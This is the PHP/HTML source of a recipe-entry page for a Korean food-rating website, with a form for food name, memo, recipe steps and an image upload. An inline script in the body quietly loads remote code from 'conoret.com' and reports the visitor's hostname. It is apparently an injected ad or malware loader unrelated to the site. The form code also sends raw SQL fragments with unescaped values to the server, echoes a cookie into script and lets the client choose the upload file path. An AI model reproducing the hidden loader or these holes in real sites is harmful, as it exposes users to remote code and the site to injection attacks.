<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="ssosso.table.u">
    <meta name="generator" content="ssosso.table food-db 0.1.0">
    <link rel="icon" href="src/favicon.png">

    <title>ssosso-table.food.recipe</title>

    <link rel="canonical" href="http://ssossotable.com">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <style>
        .bd-placeholder-img {
            font-size: 1.125rem;
            text-anchor: middle;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
        }

        @media (min-width: 768px) {
            .bd-placeholder-img-lg {
                font-size: 3.5rem;
            }
        }
    </style>

    <!-- Custom styles for this template -->

    <link rel="preconnect" href="https://fonts.googleapis.com/" crossorigin="true">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link rel="stylesheet" href="./css/main/css2">
    <link rel="stylesheet" href="./css/rating/css2">
    <link href="./css/main/cover.css" rel="stylesheet">
    <!--    <link rel="stylesheet" href="/css/insert.css">-->
    <style>
        /* iPhone4와 같은 높은 해상도 가로 */
        @media only screen and (max-width : 640px) {
            #default_traits span {
                font-size: 14px !important;
                font-weight: 150 !important;
                margin: 1px 1px 1px 1px !important;
            }
            #add_trait, #commit_to_database {
                width: 350px !important;
            }
        }
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
        html,
        body {
            font-family: Jua;
            height: 100%;
            overflow-y:scroll;
        }
        body {
            display: flex;
            align-items: center;
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #f5f5f5;
            color: #2c3034;
        }
        header {
            width: 550px;
        }
        .form-rating {
            width: 100%;#F5F4DD      padding: 15px;
            margin: auto;
        }
        #food_name_modify, #food_location_modify {
            width: 250px !important;
            margin: 1rem 0 1rem 0;
            display: inline-block;
        }
        #food_name_modify_button, #food_loaction_modify_button {
            width: 50px !important;
            height: 30px !important;
            font-size: 15px;
            padding: 0;
            margin: 1rem 0 1rem 0;
            display: inline-block;
        }
        #trait_name {
            width: 250px !important;
        }
        #traits_list {
            text-align: left;
            width: 300px !important;
            margin: auto;
            padding-top: 20px;
        }
        #add_trait, #commit_to_database{
            margin-top: 20px;
            width: 250px;
        }
        #rating .material-symbols-outlined {
            font-variation-settings:
                    'FILL' 0,
                    'wght' 400,
                    'GRAD' 0,
                    'opsz' 48
        }
        #traits ul .material-symbols-outlined {
            display: inline-block !important;
            vertical-align: middle;
        }
        #traits ul li {
            display: inline-block;
            vertical-align: middle;
            font-size: 24px;
            align-items: start;
        }
        #default_traits {
            margin: 10px 0 10px 0 !important;
            color: whitesmoke;
        }
        #default_traits span {
            font-size: 18px;
            font-weight: 200;
            margin: 2px 2px 2px 2px;
        }
        .btn {
            font-weight:100 !important;
        }
        .nav-link {
            font-weight: 300 !important;
        }
        .nav-masthead .active {
            color: #2c3034;
            border-bottom-color: transparent;
        }
        a:focus, a:hover {
            border-bottom-color: #2c3034 !important;
            color: #2c3034 !important;
        }
        p {
            color: #2c3034 !important;
        }
        html::-webkit-scrollbar {
            display: none;  /* Safari and Chrome */
        }
    </style>

    <script src="./script/rating/dsp" type="text/javascript" defer="" async=""></script>
    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script src="./script/main/dsp" type="text/javascript" defer="" async=""></script>

    <script type="text/javascript">
        let file=null
        let formData = new FormData();
        let filePath=``
        let fileName=``
        let foodName=``
        let foodNameArray=null
        let foodNameArrayString=``
        function init() {
            const preview = document.getElementById("preview"),
                fileElem = document.getElementById("fileElem");

            preview.addEventListener("click", function (e) {
                if (fileElem) {
                    fileElem.click();
                }
            }, false);
        }
        function food_name_modify() {
            let utf8Encode = new TextEncoder();
            let utf8Decode = new TextDecoder()

            const foodName=document.getElementById('food-name-modify-input').value
            foodNameArrayString=utf8Encode.encode(foodName).toString()
            foodNameArray=foodNameArrayString.split(',')
            console.log(foodNameArray)
            console.log(foodNameArrayString)
            // let arrayBuffer=new Uint8Array(foodNameArrayString)
            // console.log(arrayBuffer)
            // console.log(utf8Decode.decode(arrayBuffer))
            document.getElementById('food-name-modify-input').value=''
            if(foodName !== '') {
                document.getElementById('food-name').innerText=foodName
            }
        }
        function add_recipe() {
            let recipeContent=document.getElementById('recipe-input').value
            let format=``
            if(recipeContent!=='') {
                format=`
                <li>
                    <span class="recipe-content">${recipeContent}</span>
                    <span><img src='src/close.png' width="20px" height="20px"/></span>
                </li>
                `
                document.getElementById('recipe-list').innerHTML+=format
                document.getElementById('recipe-input').value=''
            }
        }
        async function handleFiles(files) {
            let postJson={}
            const preview=document.getElementById("preview")

            for (let i = 0; i < files.length; i++) {
                file = files[i];
                if (!file.type.startsWith('image/')){ continue }

                const img = document.createElement("img");
                img.classList.add("obj");
                img.file = file;

                img.width=240
                img.height=240

                preview.innerHTML=``
                preview.appendChild(img); // "preview"가 결과를 보여줄 div 출력이라 가정.

                const reader = new FileReader();
                reader.onload = (function(aImg) { return function(e) { aImg.src = e.target.result; }; })(img);
                reader.readAsDataURL(file);
            }
        }
        async function commit() {
            const tag=document.getElementsByClassName('recipe-content')
            const foodName=document.getElementById('food-name').innerText
            const memo=document.getElementById('recipe-memo').value
            let tags=``
            for(let i=0;i<tag.length;i++) {
                if(i===tag.length-1) {
                    tags+=tag[i].innerText
                }
                else {
                    tags+=tag[i].innerText+'|'
                }
            }
            if(file===null) {
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'insert',
                        1:'recipe(userid,foodname,memo,tags)',
                        2:`<?php echo $_COOKIE['user_id']; ?>, '${foodName}', '${memo}', '${tags}'`
                    }})
            }
            else {
                const idx=(file.name).indexOf('.')
                fileName=`<?php echo $_COOKIE['user_id']; ?>-${foodNameArrayString}.${(file.name).substring(idx+1)}`
                filePath=`/var/www/html/config/recipeImages/${fileName}`
                formData.append("filePath", filePath);
                formData.append("image", file);
                await $.ajax({
                    type: "POST",
                    url: '/script/php/DAOHandler.php',
                    data: {
                        0:'insert',
                        1:'recipe(userid,foodname,memo,tags,image)',
                        2:`<?php echo $_COOKIE['user_id']; ?>, '${foodName}', '${memo}', '${tags}', 'http://ssossotable.com/config/recipeImages/${fileName}'`
                    }})
                await $.ajax({
                    type:"POST",
                    url: "/script/php/FileHandler.php",
                    processData: false,
                    contentType: false,
                    data: formData
                })
            }
            location.reload()
        }
    </script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
</script>
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();

</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <header class="masthead mb-auto">
        <div class="inner">
            <a href="http://ssossotable.com/rating.php"><img class="masthead-brand" src="src/logo.png" width="72px" height="72px"></a>
            <nav class="nav nav-masthead justify-content-center">
                <a class="nav-link text-muted" href="http://ssossotable.com/rating.php">음식 평가하기</a>
                <a class="nav-link active" href="http://ssossotable.com/recipe.php">레시피 추가하기</a>
                <a class="nav-link text-muted" href="http://ssossotable.com/record.php">식사 기록하기</a>
                <div class="dropdown">
                    <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" style="border-color: transparent;background-color: transparent;"></button>
                    <ul class="dropdown-menu" style="">
                        <li><a class="dropdown-item" href="http://ssossotable.com/myInfo.php">내 정보</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/friends.php">친구 목록</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/diary.php">다이어리</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/my-recipe.php">나만의 레시피북</a></li>
                        <li><a class="dropdown-item" href="http://ssossotable.com/insert.php">음식 추가하기(for dev)</a></li>
                    </ul>
                </div>
            </nav>
        </div>
    </header>
    <main role="main" class="inner cover" id="rating-main" style="margin-top: 20px;">
        <div id="food_rating_database">
            <div class="card" style="width: 500px;">
                <div class="d-flex justify-content-center">
                    <div id="preview"><img src="src/food_placeholder.png" style="width: 240px!important; height: 240px!important;" class="card-img-top" alt="..."></div>
                    <input type="file" id="fileElem" multiple accept="image/*" style="display:none" onchange="handleFiles(this.files)">
                </div>
                <div class="mb-3">
                    <h5 class="card-title"><label for="exampleFormControlInput1" class="form-label" id="food-name">음식명</label></h5>
                    <div class="input-group mb-3">
                        <input id="food-name-modify-input" type="text" class="form-control" placeholder="뭘 먹었나요?" aria-label="Recipient's username" aria-describedby="button-addon2">
                        <button class="btn btn-outline-secondary" type="button" onclick="food_name_modify();" id="food-name-modify">입력</button>
                    </div>
                </div>
                <div class="mb-3">
                    <textarea class="form-control" placeholder="메모를 남겨주세요" id="recipe-memo" rows="3"></textarea>
                </div>
                <div id="recipes">
                    <div class="input-group mb-3">
                        <input type="text" id="recipe-input" class="form-control" placeholder="레시피를 추가해주세요." aria-label="Recipient's username" aria-describedby="button-addon2">
                        <button class="btn btn-outline-secondary" type="button" onclick="add_recipe();">추가</button>
                    </div>
                </div>
                <ul id="recipe-list" class="list-group list-group-flush" style="height: 100px; max-height: 100px; overflow-y:auto;">
                </ul>
                <br>
                <input type="button" value="저장하기" onclick="commit();" class="w-100 btn" style="background-color:#e4bd74; color:white;">
            </div>
        </div>
    </main>

    <footer class="mastfoot mt-auto">
        <div class="inner">
            <p>Created by<a href="http://ssossotable.com"> ssosso.table.u</a>, by <a href="http://ssossotable.com">@ssosso.table</a></p>
        </div>
    </footer>
    <script>
        init()
    </script>
</div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>